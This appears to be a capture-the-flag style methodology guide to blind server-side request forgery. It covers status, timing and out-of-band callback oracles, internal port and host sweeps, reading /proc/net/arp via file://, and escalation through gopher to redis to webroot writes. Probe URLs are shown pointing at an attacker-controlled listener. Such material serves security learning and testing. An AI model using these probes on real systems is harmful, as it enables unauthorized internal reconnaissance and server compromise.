# Blind SSRF — when nothing comes back

No response-body, no error-echo — the fetch still happens. Blind
SSRF is proven and exploited through side-channels: timing,
status, and out-of-band callbacks.

---

## 1. The three oracle shapes — which blind you have

```text
Shape A — status-oracle:
  internal-open → 200/redirect vs internal-closed → 500/timeout
  → the STATUS leaks the port-scan + host-scan — no body needed

Shape B — timing-oracle:
  all responses identical BUT elapsed differs —
  open-port → fast, filtered→ fast-fail, no-listener → slow-timeout
  → measure with http_probe --elapsed / --time-regex

Shape C — silence-total:
  every probe identical, no timing diff → OUT-OF-BAND only —
  the callback is the only measurement — oob_listener + canary
```

## 2. The out-of-band channel — the proof that doesn't need a body

```bash
# 1. stand up the listener
python3 tools/web/oob_listener.py serve --port 9000

# 2. mint a canary — a unique tag per probe — provenance!
python3 tools/web/oob_listener.py canary --base http://YOU:9000 --name probe1
# → probe1.<id>.listener.example or a full URL

# 3. feed it to the SSRF
url=http://<canary-host>/x

# 4. read hits — the log is JSONL — method/path/headers/body
python3 tools/web/oob_listener.py hits
```

A hit proves the server fetched YOUR url — that's the SSRF
primitive confirmed — but note the evidence rule: ONE callback
proves reachability, NOT the internal-target impact — for the
impact claim you still need the internal-fetch evidence (the
pingback is to YOU — external — the class needs the internal leg).

The canary-tag discipline: one tag per hypothesis — `p1.`, `p2.`
— a hit on `p2.` proves WHICH probe fired — unordered/retried
fetches don't confuse the ledger.

## 3. What the callback's request tells you

```text
- source-IP → the fetcher's egress-IP — the host's real address —
  is it a cloud-IP? a proxy? a headless-service?
- User-Agent → the fetcher — curl/x.y = libcurl (gopher/dict/file
  work!), python-requests = http-only, Java/x = java-url (jar://
  netdoc:// work!), Go-http-client, okhttp, Guzzle, Puppeteer-UA
- the path → which field/control echoes in the path
- headers → what else the fetcher attaches — auth? x-forwarded?
  proxy-headers? an internal token it forwards?!
- body → POST-fetchers — the body it carries — template-leak
- timing → WHEN it fetched — immediate vs queue-delayed vs
  per-request vs nightly-batch — the fetch-schedule
```

The UA is the fetcher fingerprint — it picks the scheme-list —
curl-UA → gopher/file/dict reachable; java-UA → jar/netdoc;
python-requests → http-only → the exploit path changes.

## 4. The DNS-callback — when even HTTP-callback fails

```text
url=http://<tag>.<yourdomain>/
   — even if HTTP egress is blocked, the DNS-LOOKUP for your
     unique subdomain may escape → your DNS-log shows the query —
     the weakest-but-working proof — "the server at least looked
     up your name"
```

`oob_listener` records HTTP hits; DNS needs a real authoritative
server you control (or interactsh/burpcollaborator/dnslog.cn in
the field). The DNS-hit alone proves the resolver ran — half the
fetch — weaker than an HTTP-hit but still reachability.

## 5. The timing-channel — extraction without a body

```text
The fetch-time encodes the answer:
  url=http://internal:PORT/x where PORT varies →
    open-port → fast response (refused-fast vs served-fast)
    closed    → connect-timeout → slow
    filtered  → fast-reset
  → port-scan via elapsed-time — binary-search the range —
    ssrf_probe's elapsed-field is the oracle
```

```bash
python3 tools/web/ssrf_probe.py --url "$BASE/fetch" --param url \
  --ports 22,80,443,3000,6379,8000,8080,9000 --timeout 4
# prints status/length/elapsed per port — the timing table
```

Timing is noisy — take 3 measurements per port, use the median —
a single slow response is network jitter not an answer. The
`--timeout` bound matters: a port-scan with timeout=4 on 20 ports
can cost 80s worst-case — that's probe-budget spending.

## 6. The status-code oracle — binary-search the answer

```text
internal:9200/_cluster/health → 200    → ES alive
internal:9200/_cat/indices    → 200    → indices
internal:x/_search?q=flag:*   → 200/404 → the QUERY's hit-or-miss
                                   → flag-existence oracle!
internal:6379 → gopher → eval → 200 + body-echo? no — blind —
  → redis SET a key? → can't read back — write-only
  → but SET a key then GET it via a SECOND url-fetch — same
     fetcher-session? different — the redis is shared-state —
     the SECOND fetch reads what the first wrote!
```

The shared-state trick: blind-write + blind-read across TWO
fetches — write `SET probe X` via fetch-1, then `GET probe` via
fetch-2 — if the responses differ → the write landed → the data
moves through the STORE not the response — a write-read channel!

## 7. The error-echo — "blind" that isn't

```text
"blind" often means "no body on success" — but ERRORS may echo:
  url=http://internal:6379/ → 500 + "connection reset" vs
  url=http://internal:9999/ → 500 + "connection refused"
  → the error-STRING differs → a text-oracle — not blind at all
Always send to a closed-port FIRST — read the error-shape —
  the closed-port error is the BASELINE — every other response
  diffs against it
```

Read error-bodies religiously — they're the cheapest oracle:
`Connection refused`/`timeout`/`reset`/`SSRF blocked`/`Invalid
URL`/`name or service not known`/`temporary failure in name
resolution`/`no route to host` — each a different failure-stage:
dns vs tcp vs app vs filter.

## 8. The host-scan — mapping with a blind fetch

```text
The port-sweep generalizes to a HOST-sweep — the subnet:
  for i in 1..254: url=http://10.0.0.<i>:80/
    open-ip → response/timing; dead-ip → timeout/refused
  → the ARP/PINGless internal-host-map
  — bounded: 20 host-guesses max, then pivot — don't spray /24
```

`/proc/net/arp` via file:// gives the REAL neighbors — read it
first — sweep only what arp confirms exists — the deterministic
map beats the spray.

## 9. The deferral shapes — when the fetch isn't synchronous

```text
- the url is stored, fetched LATER (a bot, a queue, a renderer)
  → timing/status useless — OOB-only — the canary still fires
- the fetch runs on a DIFFERENT host (a worker) — the callback's
  source-ip is the worker's, not the web's — different internal
  position — different reachable-set!
- the fetch is cached — repeated probes don't re-fetch — your
  canary-fires once then stops — the cache-timeline
```

The deferred-fetch is the webhook/report-bot shape — the probe
registers a url and the fetch happens out-of-band — your callback
is the ONLY measurement and it tells you WHEN (queue-latency)
and FROM where (the worker's egress).

## 10. The blind-extraction chains — getting DATA out blind

```text
No direct channel → build one:
a) DNS-exfil inside the fetch — if you can make the fetch-target
   contain data... you can't — the fetcher picks the target
b) shared-store oracle — write via gopher/redis, read via a 2nd
   fetch or a known state-endpoint — covered above
c) timing-encode — the fetch's TIMING as the bit — you control
   only the target — encode data in WHICH target you send —
   no — the DATA must come from the internal side — can't
d) content-length-diff — response has no body but content-length
   may differ — a size-oracle
e) error-string-diff — the error-message carries a byte of the
   answer — "no such host" vs "refused" — 1-bit-oracle → binary
   search the flag-char by char — SLOW but works:
     url=http://internal:PORT/ where PORT=atoi(flag[i])-encoded?
     — no — the oracle answers yes/no questions — frame the flag-
       check as host/port: is flag[i]=='a'? → craft a target that
       succeeds iff true — usually impossible — blind-ssrf
       extraction is the hardest shape — the usual real answer is
       to ESCALATE (gopher→redis→file-write→fetch-the-file)
```

Blind-SSRF extraction is nearly always "escalate to a stateful
store then read it back" — redis-write + http-read — or "the flag
is reachable as a url" — find the url (`/flag`, `admin/flag`).

## 11. The chain that turns blind→non-blind

```text
blind-ssrf + file://-write? — no — file:// is read-only for the
  fetcher
blind-ssrf + gopher→redis→webroot → write a file the WEB serves →
  then GET it via the SAME url-fetch → now non-blind — the
  red-island shape — redis persists to webroot → the flag-page
  is now a url — fetch it
blind-ssrf + cloud-metadata → user-data IS the response — if the
  fetch echoes AT ALL it echoes metadata — check the response
  once more — a 1-byte diff is a channel
```
